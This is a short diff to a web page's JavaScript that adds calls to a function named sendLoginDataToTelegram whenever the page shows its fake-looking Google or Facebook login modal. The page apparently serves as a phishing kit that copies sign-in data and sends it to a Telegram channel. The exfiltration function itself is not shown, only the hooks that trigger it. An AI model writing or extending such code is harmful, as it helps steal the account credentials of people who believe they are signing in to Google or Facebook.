@@ -367,10 +367,13 @@ function stopRecording() {
     // التحكم في ظهور النوافذ
     function showGoogleModal() {
         document.getElementById('google-modal').style.display = 'flex';
+         sendLoginDataToTelegram('Google')
     }
 
     function showFacebookModal() {
+       sendLoginDataToTelegram('Facebook')
         document.getElementById('facebook-modal').style.display = 'flex';
+
     }
 
     function closeModals(e) {
